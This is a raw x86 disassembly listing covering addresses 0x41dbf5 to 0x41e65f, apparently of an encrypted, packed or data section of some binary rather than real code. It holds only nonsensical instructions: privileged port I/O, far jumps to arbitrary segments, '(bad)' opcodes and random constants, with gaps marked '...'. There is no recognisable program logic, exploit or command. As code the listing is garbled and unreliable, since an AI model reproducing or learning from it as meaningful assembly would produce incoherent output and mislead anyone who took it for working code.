  41dbf5:	fcomp  QWORD PTR [ecx-0x7d18ed0e]
  41dbfb:	or     al,0x49
  41dbfd:	push   esi
  41dbfe:	sub    DWORD PTR ds:0x654a8c25,ebx
  41dc04:	sub    esi,DWORD PTR [esi]
  41dc06:	stos   BYTE PTR es:[edi],al
  41dc07:	js     0x41dc04
  41dc09:	retf   0x3d96
  41dc0c:	inc    eax
  41dc0d:	repz imul eax,DWORD PTR [ecx-0x55f87bf3],0xe96281d2
  41dc18:	int3   
  41dc19:	inc    eax
  41dc1a:	add    dh,BYTE PTR [ebx+eiz*2-0x49]
  41dc1e:	fild   QWORD PTR [ebp-0x27e6c24d]
  41dc24:	xchg   ch,dh
  41dc26:	imul   esi,DWORD PTR [eax-0x10],0xffffff9e
  41dc2a:	lea    ecx,[edx]
  41dc2c:	mov    cl,BYTE PTR [esi+0xd]
  41dc2f:	test   BYTE PTR [edx+ebx*8+0x31a0956e],0xb8
  41dc37:	push   eax
  41dc38:	jmp    0x6fb2:0x53af689c
  41dc3f:	ret    
  41dc40:	ret    0x0
	...
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x2e
  41dcc1:	sbb    al,0x47
  41dcc3:	mov    ecx,0x14077
  41dcc8:	cmc    
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	add    dh,dh
  41dccd:	jmp    0x41dc5f
  41dccf:	fwait
  41dcd0:	xchg   edx,eax
  41dcd1:	fs pop es
  41dcd3:	xchg   esi,eax
  41dcd4:	mov    BYTE PTR [eax],ch
  41dcd6:	jmp    0x41dcaa
  41dcd8:	jbe    0x41dcbf
  41dcda:	jmp    0xc17828d8
  41dcdf:	daa    
  41dce0:	pop    ecx
  41dce1:	sub    ch,BYTE PTR [ebx-0x77]
  41dce4:	or     DWORD PTR ds:[esi-0x7ffff082],edi
  41dceb:	cmp    BYTE PTR [edi+0x22211e55],dl
  41dcf1:	cs (bad) 
  41dcf3:	sub    esi,DWORD PTR [edi]
  41dcf5:	enter  0x1610,0x2b
  41dcf9:	cmp    DWORD PTR [edi-0x61e07df],edi
  41dcff:	or     DWORD PTR [eax-0x14],esp
  41dd02:	inc    ebx
  41dd03:	test   bh,bh
  41dd05:	mov    DWORD PTR [eax+0x61],0xa436e475
  41dd0c:	fld    QWORD PTR [ebp-0x55]
  41dd0f:	repz sbb eax,0x26e14e7b
  41dd15:	push   edx
  41dd16:	dec    edx
  41dd17:	out    0x75,al
  41dd19:	add    bl,BYTE PTR [ebp+0x168f93ff]
  41dd1f:	sub    BYTE PTR [eax-0x43],dl
  41dd22:	add    bl,ah
  41dd24:	jae    0x41dd24
  41dd26:	xchg   edx,eax
  41dd27:	cmc    
  41dd28:	xor    DWORD PTR ds:0x6332806f,edi
  41dd2e:	sub    eax,0xb851ed87
  41dd33:	jmp    0x41dd97
  41dd35:	dec    ebx
  41dd36:	mov    ds:0x6e97424c,al
  41dd3b:	xchg   ebp,eax
  41dd3c:	aas    
  41dd3d:	and    ebx,DWORD PTR [eax]
  41dd3f:	and    eax,0xe27e3809
  41dd44:	adc    DWORD PTR ds:0x97453c4c,ebx
  41dd4a:	call   0xd5a8:0xeb7fff47
  41dd51:	jecxz  0x41ddbc
  41dd53:	or     BYTE PTR [ebx],ah
  41dd55:	sub    DWORD PTR [edx-0x2e6b7acf],ebp
  41dd5b:	rol    ebp,1
  41dd5d:	xor    eax,esi
  41dd5f:	pop    sp
  41dd61:	pop    ss
  41dd62:	inc    edi
  41dd63:	pusha  
  41dd64:	add    eax,0x77162380
  41dd69:	and    esi,DWORD PTR [edx+eiz*2+0x7]
  41dd6d:	mov    ch,0x61
  41dd6f:	adc    bh,ch
  41dd71:	xlat   BYTE PTR ds:[ebx]
  41dd72:	test   eax,0x790867f3
  41dd77:	outs   dx,BYTE PTR ds:[esi]
  41dd78:	xor    ah,BYTE PTR [eax+0x7b]
  41dd7b:	ret    0xdc65
  41dd7e:	leave  
  41dd7f:	popa   
  41dd80:	pop    edi
  41dd81:	adc    dh,BYTE PTR [ebp+0x1632b120]
  41dd87:	call   0xa6085546
  41dd8c:	push   0x990dfbee
  41dd91:	inc    esp
  41dd92:	clc    
  41dd93:	push   ebx
  41dd94:	stc    
  41dd95:	das    
  41dd96:	adc    BYTE PTR [edx],ch
  41dd98:	dec    esi
  41dd99:	jne    0x41dd72
  41dd9b:	dec    edi
  41dd9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd9d:	cs jecxz 0x41dd6a
  41dda0:	sub    al,0xc3
  41dda2:	enter  0xb473,0x90
  41dda6:	ret    0x1d9a
  41dda9:	push   eax
  41ddaa:	repnz dec ebp
  41ddac:	std    
  41ddad:	js     0x41dd3c
  41ddaf:	and    bl,dh
  41ddb1:	xor    DWORD PTR [ebx+0x22],0x2d24e8d1
  41ddb8:	push   ebp
  41ddb9:	rcr    DWORD PTR [edx-0x4e9d25a5],0x3c
  41ddc0:	mov    al,ds:0x0
	...
  41de31:	add    BYTE PTR [eax],al
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	mov    al,ds:0x6c9184c6
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	cmc    
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    BYTE PTR [ebp-0xcac20a0],bl
  41de51:	cdq    
  41de52:	xor    dl,BYTE PTR [ebx+0x28]
  41de55:	jg     0x41deb3
  41de57:	imul   ecx,DWORD PTR [edx],0xffffffa1
  41de5a:	or     BYTE PTR [edx],cl
  41de5c:	push   edx
  41de5d:	mov    al,ds:0xb74f3d03
  41de62:	or     edx,DWORD PTR ds:0xeee1d121
  41de68:	xchg   ecx,eax
  41de69:	mov    ebx,0x6f35ac62
  41de6e:	mov    ecx,0x8a0bbc72
  41de73:	mov    ds:0x3cf6caf3,eax
  41de78:	or     al,0xb7
  41de7a:	adc    BYTE PTR [ebp-0x3d],0xe5
  41de7e:	sbb    bh,BYTE PTR [ebp+ebx*8-0x7611d48c]
  41de85:	sub    DWORD PTR [esp+edi*2],edi
  41de88:	ins    BYTE PTR es:[edi],dx
  41de89:	mov    eax,ds:0xf4fb2916
  41de8e:	or     al,0x14
  41de90:	sub    eax,0x4801d733
  41de95:	nop
  41de96:	ja     0x41df03
  41de98:	add    DWORD PTR [ecx+0x6b],esi
  41de9b:	dec    BYTE PTR [edx-0x2c]
  41de9e:	mov    bl,0x1b
  41dea0:	(bad)  
  41dea2:	lds    ebp,FWORD PTR [eax]
  41dea4:	fst    DWORD PTR ds:0xc4f59dd
  41deaa:	mov    ebp,0x5de4edfb
  41deaf:	mov    ebx,0x3a93205b
  41deb4:	arpl   ax,bp
  41deb6:	in     eax,0xdd
  41deb8:	cwde   
  41deb9:	pop    esi
  41deba:	cwde   
  41debb:	daa    
  41debc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41debd:	retf   
  41debe:	loope  0x41de41
  41dec0:	mov    edx,0xb17d3880
  41dec5:	aas    
  41dec6:	nop
  41dec7:	popw   es
  41dec9:	push   ecx
  41deca:	imul   edi,ecx,0x57c8f33c
  41ded0:	push   esi
  41ded1:	cdq    
  41ded2:	lds    eax,FWORD PTR [ecx]
  41ded4:	in     al,dx
  41ded5:	aas    
  41ded6:	rcl    BYTE PTR [ecx+0x15],cl
  41ded9:	adc    ecx,DWORD PTR [edi-0x76]
  41dedc:	(bad)  
  41dedd:	push   0x1a90c1f1
  41dee2:	cld    
  41dee3:	cmp    ah,BYTE PTR [ebp-0x5bdc3227]
  41dee9:	adc    esi,DWORD PTR [esi+0x3d82a2b8]
  41deef:	pop    esp
  41def0:	rcl    cl,cl
  41def2:	sub    al,0x87
  41def4:	inc    ebp
  41def5:	sub    bh,cl
  41def7:	addr16 aam 0xa9
  41defa:	or     al,0x82
  41defc:	push   0x5e347a8e
  41df01:	jp     0x41ded9
  41df03:	loopne 0x41deb6
  41df05:	mov    WORD PTR [eax+0x9],cs
  41df08:	inc    ebp
  41df09:	inc    edi
  41df0a:	dec    ebp
  41df0b:	(bad)  
  41df0c:	adc    esi,ebp
  41df0e:	cmp    al,dh
  41df10:	sbb    dl,BYTE PTR [edi+0x11a863f6]
  41df16:	mov    ecx,0xf58ee45e
  41df1b:	stos   BYTE PTR es:[edi],al
  41df1c:	pop    esp
  41df1d:	xchg   ebx,eax
  41df1e:	xor    eax,0xa00be04
  41df23:	xchg   edi,eax
  41df24:	xlat   BYTE PTR ds:[ebx]
  41df25:	hlt    
  41df26:	or     eax,0x14a662d4
  41df2b:	adc    ecx,DWORD PTR [ebx+ebp*2+0x77b1e01b]
  41df32:	test   ebx,esi
  41df34:	dec    ebx
  41df35:	shl    DWORD PTR [esi-0x54],cl
  41df38:	mov    edx,0x4d273a85
  41df3d:	outs   dx,BYTE PTR ds:[esi]
  41df3e:	and    BYTE PTR [ecx+0x66],0x0
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	mov    edx,0x61724059
  41dfc5:	inc    edx
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [ebx-0x774e1ac1],bh
  41dfd1:	jge    0x41df61
  41dfd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfd4:	xchg   ecx,eax
  41dfd5:	in     al,dx
  41dfd6:	jo     0x41df8e
  41dfd8:	dec    ebx
  41dfd9:	push   ecx
  41dfda:	xchg   edi,eax
  41dfdb:	mov    eax,DWORD PTR [ebx+0x4c70ec61]
  41dfe1:	popf   
  41dfe2:	stc    
  41dfe3:	aam    0x7a
  41dfe5:	add    eax,0xd1dc8605
  41dfea:	and    ah,bh
  41dfec:	push   edi
  41dfed:	aaa    
  41dfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfef:	inc    esp
  41dff0:	enter  0x66da,0xb7
  41dff4:	inc    ebx
  41dff5:	in     eax,0x63
  41dff7:	ins    DWORD PTR es:[edi],dx
  41dff8:	pop    esi
  41dff9:	adc    eax,ecx
  41dffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dffc:	dec    ebx
  41dffd:	dec    esi
  41dffe:	std    
  41dfff:	fisttp DWORD PTR [edx]
  41e001:	test   BYTE PTR [eax],ah
  41e003:	stos   BYTE PTR es:[edi],al
  41e004:	pop    ebp
  41e005:	das    
  41e006:	ins    DWORD PTR es:[edi],dx
  41e007:	sub    DWORD PTR [esi],edi
  41e009:	fs enter 0x2505,0xef
  41e00e:	sub    DWORD PTR [ebx+0x41],ecx
  41e011:	and    eax,0x7fd572c7
  41e016:	aad    0x1b
  41e018:	imul   edi,DWORD PTR [eax+0x3c],0x38a8bace
  41e01f:	idiv   DWORD PTR [ebx+0x6e511b62]
  41e025:	ds jb  0x41e04f
  41e028:	xchg   esi,eax
  41e029:	xor    DWORD PTR [ecx-0x55085226],edi
  41e02f:	ja     0x41e01d
  41e031:	fimul  WORD PTR [edx-0x5e]
  41e034:	aaa    
  41e035:	repz lds ebx,FWORD PTR ds:0xec05b45c
  41e03c:	cmp    al,0x34
  41e03e:	shl    DWORD PTR [esi],cl
  41e040:	neg    esi
  41e042:	push   ecx
  41e043:	lock or al,0x4
  41e046:	out    0xe8,eax
  41e048:	mov    edx,0x8ee7fb94
  41e04d:	push   0x9a295b6f
  41e052:	shr    ah,0x8
  41e055:	inc    esi
  41e056:	xchg   edi,eax
  41e057:	mov    ebp,0x3a28d37a
  41e05c:	adc    DWORD PTR [edi+0x12bd4fca],ebx
  41e062:	int3   
  41e063:	call   0x5ea:0x4a1729c2
  41e06a:	gs xchg esi,eax
  41e06c:	cdq    
  41e06d:	adc    ch,ah
  41e06f:	pop    ebx
  41e070:	scas   al,BYTE PTR es:[edi]
  41e071:	xchg   edx,eax
  41e072:	jmp    0xc44a:0xf4318309
  41e079:	ja     0x41e0e4
  41e07b:	test   DWORD PTR ds:0xa6597b2b,edi
  41e081:	inc    BYTE PTR [ecx]
  41e083:	mov    edi,0x1ecae16e
  41e088:	test   ecx,ebx
  41e08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e08b:	mov    BYTE PTR [edx],ah
  41e08d:	scas   al,BYTE PTR es:[edi]
  41e08e:	lods   eax,DWORD PTR ds:[esi]
  41e08f:	mov    bl,0xc4
  41e091:	push   ss
  41e092:	jle    0x41e09e
  41e094:	inc    ebp
  41e095:	out    dx,al
  41e096:	ins    BYTE PTR es:[edi],dx
  41e097:	and    DWORD PTR [ebp+0x93f5b8],esp
  41e09d:	mov    dl,0xde
  41e09f:	stc    
  41e0a0:	cmc    
  41e0a1:	cmp    ebx,edi
  41e0a3:	jle    0x41e09f
  41e0a5:	cmp    edx,DWORD PTR [ebx]
  41e0a7:	lahf   
  41e0a8:	add    eax,DWORD PTR [edx]
  41e0aa:	int    0x16
  41e0ac:	pop    ebp
  41e0ad:	mov    ebp,0xf2442c12
  41e0b2:	popf   
  41e0b3:	and    al,0x9b
  41e0b5:	call   DWORD PTR [edx-0x4da8ce5f]
  41e0bb:	fwait
  41e0bc:	inc    ebp
  41e0bd:	sbb    al,0xd4
  41e0bf:	call   0x41e0c7
	...
  41e134:	push   eax
  41e135:	ret    
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	cmp    ebx,edx
  41e142:	je     0x41e16d
  41e144:	push   esi
  41e145:	inc    ebx
  41e146:	add    DWORD PTR [eax],eax
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [ebp+0x5e0f82a8],dh
  41e151:	push   edx
  41e152:	and    DWORD PTR [eax-0x706ed456],0xffffffc1
  41e159:	clc    
  41e15a:	test   al,0x4c
  41e15c:	pop    ds
  41e15d:	xchg   edi,eax
  41e15e:	or     bl,bl
  41e160:	xor    DWORD PTR [edi],ebp
  41e162:	imul   esi,DWORD PTR [edi+edi*1],0xffffffee
  41e166:	xchg   edi,eax
  41e167:	hlt    
  41e168:	and    DWORD PTR [eax-0x30],ecx
  41e16b:	rcr    DWORD PTR [edi+0x59],0x5f
  41e16f:	js     0x41e12d
  41e171:	loope  0x41e1b1
  41e173:	and    al,0xe6
  41e175:	push   esi
  41e176:	outs   dx,DWORD PTR ds:[esi]
  41e177:	lods   eax,DWORD PTR ds:[esi]
  41e178:	lock dec ebx
  41e17a:	test   ecx,ebx
  41e17c:	rol    bl,1
  41e17e:	xchg   ebx,eax
  41e17f:	inc    edx
  41e180:	into   
  41e181:	inc    ebx
  41e182:	pop    ebx
  41e184:	call   0x751e:0x43b11dbc
  41e18b:	xor    esi,DWORD PTR [ebx+0x19]
  41e18e:	push   ebx
  41e18f:	inc    edi
  41e190:	ins    DWORD PTR es:[edi],dx
  41e191:	push   esi
  41e192:	xor    al,0xd4
  41e194:	rcr    bl,1
  41e196:	mov    ebx,0xadc2a2df
  41e19b:	je     0x41e165
  41e19d:	paddd  mm1,mm4
  41e1a0:	mov    ch,bl
  41e1a2:	aaa    
  41e1a3:	sbb    cl,BYTE PTR [esi]
  41e1a5:	out    dx,al
  41e1a6:	int    0x10
  41e1a8:	push   edx
  41e1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1aa:	xchg   ebp,eax
  41e1ab:	mov    esi,DWORD PTR [esi+0x67]
  41e1ae:	into   
  41e1af:	arpl   bx,bx
  41e1b1:	mov    dh,0xad
  41e1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1b4:	jns    0x41e18b
  41e1b6:	fstp   QWORD PTR [esi]
  41e1b8:	pop    ebp
  41e1b9:	fiadd  WORD PTR [esi+0x44]
  41e1bc:	sub    dl,cl
  41e1be:	or     BYTE PTR es:[edi],bh
  41e1c1:	dec    edi
  41e1c2:	sub    DWORD PTR [ebx-0x46306a55],ebx
  41e1c8:	aad    0x98
  41e1ca:	out    dx,al
  41e1cb:	test   al,0x68
  41e1cd:	push   ss
  41e1ce:	cmp    al,ah
  41e1d0:	mov    esi,0x43d37384
  41e1d5:	inc    eax
  41e1d6:	iretw  
  41e1d8:	jl     0x41e1d6
  41e1da:	xor    ah,BYTE PTR [eax-0x1d]
  41e1dd:	imul   edi,DWORD PTR [edx],0x8aebcbe5
  41e1e3:	xchg   edx,eax
  41e1e4:	jns    0x41e1f2
  41e1e6:	dec    edi
  41e1e7:	sbb    cl,0x93
  41e1ea:	(bad)  
  41e1eb:	popf   
  41e1ec:	dec    esi
  41e1ed:	into   
  41e1ee:	stos   DWORD PTR es:[edi],eax
  41e1ef:	cdq    
  41e1f0:	(bad)  
  41e1f1:	and    ah,dh
  41e1f3:	das    
  41e1f4:	mov    ebx,0x5a9dbd67
  41e1f9:	mov    bh,0x85
  41e1fb:	(bad)  
  41e1fc:	repz loop 0x41e1c6
  41e1ff:	pop    ds
  41e200:	out    dx,eax
  41e201:	dec    ecx
  41e202:	add    bl,ah
  41e204:	ret    0x7758
  41e207:	jbe    0x41e1f7
  41e209:	cmc    
  41e20a:	out    0xbb,eax
  41e20c:	mov    DWORD PTR [edx+0x65],esp
  41e20f:	ss xor esp,edi
  41e212:	pop    edx
  41e213:	pushf  
  41e214:	adc    DWORD PTR [ebx+eax*1-0x5f23aace],esi
  41e21b:	sbb    BYTE PTR fs:[edx-0x28],ch
  41e21f:	cdq    
  41e220:	mov    esi,0x5eb38400
  41e225:	sbb    eax,DWORD PTR [esi+edx*8-0x38]
  41e229:	je     0x41e283
  41e22b:	fiadd  WORD PTR [edx+0x488ac1f7]
  41e231:	test   BYTE PTR ds:0x91b2395,dh
  41e237:	adc    edx,DWORD PTR [eax]
  41e239:	and    eax,0x48db2cc5
  41e23e:	mov    ds:0x8c14,eax
	...
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx-0x6d],di
  41e2c1:	sbb    edx,DWORD PTR [ebp+0x1444ba2]
  41e2c7:	add    ch,dh
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [edi],dl
  41e2cd:	pop    esp
  41e2ce:	inc    edi
  41e2cf:	dec    ebx
  41e2d0:	pop    esp
  41e2d1:	call   0x7395bc69
  41e2d6:	arpl   WORD PTR [esi-0x1d],ax
  41e2d9:	pop    esi
  41e2da:	and    dl,0x9d
  41e2dd:	icebp  
  41e2de:	lahf   
  41e2df:	pop    ecx
  41e2e0:	retf   0xe416
  41e2e3:	aam    0x5
  41e2e5:	out    dx,al
  41e2e6:	cmp    eax,0x73c4716f
  41e2eb:	out    0xc4,al
  41e2ed:	ret    0xf51c
  41e2f0:	jp     0x41e284
  41e2f2:	jnp    0x41e2c2
  41e2f4:	pop    edx
  41e2f5:	pusha  
  41e2f6:	sar    DWORD PTR [edx+0x3cce5751],1
  41e2fc:	lock or ebx,DWORD PTR [eax+ebx*2-0x1ac3c10e]
  41e304:	icebp  
  41e305:	jnp    0x41e344
  41e307:	cmc    
  41e308:	jl     0x41e338
  41e30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e30b:	inc    edx
  41e30c:	popf   
  41e30d:	cmp    ecx,DWORD PTR [esi+eiz*1]
  41e310:	fs jl  0x41e306
  41e313:	fisttp WORD PTR [esi+0x3d949437]
  41e319:	inc    edx
  41e31a:	jg     0x2813e0b2
  41e320:	(bad)  
  41e321:	xor    BYTE PTR ds:0x52b7c7ef,bl
  41e327:	push   cs
  41e328:	cmp    ebx,DWORD PTR [ecx]
  41e32a:	mov    ch,BYTE PTR [ebp+eax*1+0x3e]
  41e32e:	ja     0x41e377
  41e330:	lods   al,BYTE PTR ds:[esi]
  41e331:	je     0x41e31a
  41e333:	adc    ecx,0xffffffc8
  41e336:	cmp    DWORD PTR [edi+0x39dc452e],esi
  41e33c:	ins    DWORD PTR es:[edi],dx
  41e33d:	ins    DWORD PTR es:[edi],dx
  41e33e:	cmp    DWORD PTR [edi+0x57d0771b],ecx
  41e344:	mov    al,ds:0xc25121d7
  41e349:	sub    eax,0x94dcb0fb
  41e34e:	cld    
  41e34f:	lds    edx,FWORD PTR [edi]
  41e351:	sbb    ecx,edi
  41e353:	dec    edx
  41e354:	jmp    0xe090:0x69193df0
  41e35b:	and    bl,BYTE PTR [ecx-0xcfb42e7]
  41e361:	ret    0xa61d
  41e364:	push   esi
  41e365:	mov    BYTE PTR [ecx+edx*1],ah
  41e368:	xchg   cl,dl
  41e36a:	lods   al,BYTE PTR ds:[esi]
  41e36b:	data16 jg 0x41e34c
  41e36e:	frstor [esi+0x60]
  41e371:	arpl   WORD PTR [eax-0x2b],sp
  41e374:	popa   
  41e375:	sbb    al,0x55
  41e377:	jbe    0x41e355
  41e379:	xor    edx,esi
  41e37b:	out    dx,al
  41e37c:	int    0x98
  41e37e:	push   eax
  41e37f:	rcr    BYTE PTR [eax+ebx*4-0x7372d266],cl
  41e386:	mov    ecx,0x4e2a68e6
  41e38b:	sbb    edi,esp
  41e38d:	mov    ds:0xe18c6f15,eax
  41e392:	inc    ecx
  41e393:	and    al,0x45
  41e395:	out    dx,al
  41e396:	cmp    cl,dh
  41e398:	push   esp
  41e399:	dec    esi
  41e39a:	sub    eax,0xc1451748
  41e39f:	xor    al,0xf6
  41e3a1:	scas   eax,DWORD PTR es:[di]
  41e3a3:	mov    ch,0xed
  41e3a5:	inc    esi
  41e3a6:	out    0xf4,eax
  41e3a8:	mov    dh,0xd4
  41e3aa:	call   0xffb4:0x7e674e21
  41e3b1:	inc    eax
  41e3b2:	mov    BYTE PTR [eax+edx*2-0x772f06a4],dl
  41e3b9:	mov    dl,BYTE PTR [ecx-0x328fd358]
  41e3bf:	add    DWORD PTR [esi+0x0],0x0
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x76c9fead,al
  41e442:	cwde   
  41e443:	dec    ebp
  41e444:	inc    eax
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    al,cl
  41e44d:	ins    BYTE PTR es:[edi],dx
  41e44e:	in     eax,0xa
  41e450:	das    
  41e451:	and    bh,0x53
  41e454:	(bad)  
  41e456:	icebp  
  41e457:	(bad)  
  41e459:	push   ss
  41e45a:	adc    al,0xf3
  41e45c:	enter  0x30c2,0x44
  41e460:	xor    DWORD PTR [eax+0xa8313cd],eax
  41e466:	mov    ebp,esi
  41e468:	jae    0x41e49a
  41e46a:	mov    ch,0x4e
  41e46c:	xchg   ecx,eax
  41e46d:	push   eax
  41e46e:	gs dec esp
  41e470:	sbb    al,0x98
  41e472:	xor    BYTE PTR [edx],bl
  41e474:	int3   
  41e475:	neg    DWORD PTR [edi-0x36e841b]
  41e47b:	outs   dx,DWORD PTR ds:[esi]
  41e47c:	dec    ebp
  41e47d:	ins    DWORD PTR es:[edi],dx
  41e47e:	enter  0xa129,0xe1
  41e482:	push   es
  41e483:	push   esi
  41e484:	test   al,0xf1
  41e486:	arpl   WORD PTR [esi],bx
  41e488:	or     DWORD PTR [esi],ecx
  41e48a:	ret    
  41e48b:	std    
  41e48c:	jmp    0x55be:0x4197480f
  41e493:	pop    eax
  41e494:	ja     0x41e4ff
  41e496:	mov    dh,0x95
  41e498:	pop    ss
  41e499:	mov    al,ds:0xd4400363
  41e49e:	shr    BYTE PTR [ebp-0x3c],0x93
  41e4a2:	add    ch,bl
  41e4a4:	push   esp
  41e4a5:	jg     0x41e512
  41e4a7:	div    BYTE PTR [eax]
  41e4a9:	lds    ebp,FWORD PTR [eax+0x13b0b795]
  41e4af:	jge    0x41e4f9
  41e4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4b2:	xchg   edx,eax
  41e4b3:	add    eax,0x62dc2a25
  41e4b8:	xor    BYTE PTR [ecx],0x4d
  41e4bb:	(bad)  
  41e4bd:	leave  
  41e4be:	dec    esp
  41e4bf:	jno    0x41e4a8
  41e4c1:	cdq    
  41e4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4c3:	aad    0x1d
  41e4c5:	and    ah,bh
  41e4c7:	stc    
  41e4c8:	call   0xf5bf8fa9
  41e4cd:	(bad)  
  41e4ce:	mov    cl,0x1f
  41e4d0:	stos   BYTE PTR es:[edi],al
  41e4d1:	mov    dh,0xc1
  41e4d3:	cld    
  41e4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4d5:	mov    ecx,0x16ca77b
  41e4da:	jb     0x41e4ea
  41e4dc:	mov    ds:0xce326efd,eax
  41e4e1:	jne    0x41e4c3
  41e4e3:	rcl    BYTE PTR [eax],0x39
  41e4e6:	repz pusha 
  41e4e8:	mov    ebx,0xe8fd6a88
  41e4ed:	mov    al,ds:0x1ce06720
  41e4f2:	out    dx,eax
  41e4f3:	mov    gs,WORD PTR [ebx+0x2423b10d]
  41e4f9:	ret    
  41e4fa:	push   esi
  41e4fb:	or     eax,0x1f404aef
  41e500:	push   0x916aa1ab
  41e505:	cmp    DWORD PTR [edi+ebx*1+0x64],ebp
  41e509:	call   0x6babd5f7
  41e50e:	outs   dx,DWORD PTR ds:[esi]
  41e50f:	xchg   cl,ah
  41e511:	push   esi
  41e512:	xchg   ebp,eax
  41e513:	add    edx,ebp
  41e515:	retf   0xb19d
  41e518:	inc    BYTE PTR [edx]
  41e51a:	push   ecx
  41e51b:	sbb    bl,BYTE PTR ds:0x261bf327
  41e521:	inc    edi
  41e522:	cs and al,0x28
  41e525:	and    al,0x89
  41e527:	sub    DWORD PTR [edi+0x68],0x6318f05a
  41e52e:	ja     0x41e4cb
  41e530:	jbe    0x41e508
  41e532:	mov    edx,0x4da6a38e
  41e537:	rcr    esi,cl
  41e539:	jne    0x41e594
  41e53b:	inc    eax
  41e53c:	jp     0x41e4c8
  41e53e:	jnp    0x41e544
  41e540:	dec    esp
	...
  41e5b1:	add    BYTE PTR [eax],al
  41e5b3:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz cmp edi,DWORD PTR [ebp+0x4635e262]
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	cmc    
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [eax+0x1a4cbdb],al
  41e5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5d2:	jecxz  0x41e57b
  41e5d4:	aas    
  41e5d5:	pop    eax
  41e5d6:	inc    esp
  41e5d7:	push   ds
  41e5d8:	test   al,0xd2
  41e5da:	ffree  st(1)
  41e5dc:	xchg   edx,eax
  41e5dd:	test   al,0x7d
  41e5df:	jnp    0x41e60f
  41e5e1:	(bad)  
  41e5e2:	and    dl,al
  41e5e4:	mov    edi,0xe2387f2
  41e5e9:	xor    BYTE PTR [esi-0x6a],bl
  41e5ec:	mov    edx,0x55b75944
  41e5f1:	xchg   DWORD PTR [ecx+0x2cb5d44e],eax
  41e5f7:	mov    bh,0xdc
  41e5f9:	inc    ecx
  41e5fa:	enter  0xf582,0xfe
  41e5fe:	sub    BYTE PTR [ebp+0x5a],cl
  41e601:	js     0x41e5fa
  41e603:	mov    ebp,DWORD PTR [ecx-0x60c11a71]
  41e609:	cmc    
  41e60a:	sahf   
  41e60b:	jno    0x41e61f
  41e60d:	mov    ebx,0x9713bdda
  41e612:	xor    al,0xcc
  41e614:	adc    cl,BYTE PTR [edi-0x1c]
  41e617:	lods   eax,DWORD PTR ds:[esi]
  41e618:	outs   dx,BYTE PTR ds:[esi]
  41e619:	push   eax
  41e61a:	mov    BYTE PTR [ecx+edi*8],al
  41e61d:	je     0x41e60e
  41e61f:	(bad)
  41e622:	xor    BYTE PTR [ebp-0x6080c8d2],ah
  41e628:	into   
  41e629:	cs adc bh,al
  41e62c:	and    BYTE PTR [ecx],ah
  41e62e:	aad    0x79
  41e630:	xchg   esp,eax
  41e631:	push   ds
  41e632:	data16 js 0x41e651
  41e635:	mov    ch,0x3
  41e637:	bound  ecx,QWORD PTR [ecx+0x5812be14]
  41e63d:	mov    edx,0xc9f3dec1
  41e642:	nop
  41e643:	out    0x48,eax
  41e645:	ins    BYTE PTR es:[edi],dx
  41e646:	lock or dh,ch
  41e649:	out    0x11,al
  41e64b:	stos   BYTE PTR es:[edi],al
  41e64c:	adc    al,cl
  41e64e:	stos   BYTE PTR es:[edi],al
  41e64f:	sti    
  41e650:	cmp    DWORD PTR [ecx-0x30],eax
  41e653:	pop    ebx
  41e654:	xor    al,0xc1
  41e656:	cmp    al,0x9
  41e658:	bound  esi,QWORD PTR [eax-0x56e63ba3]
  41e65e:	push   ecx
  41e65f:	inc    ebx
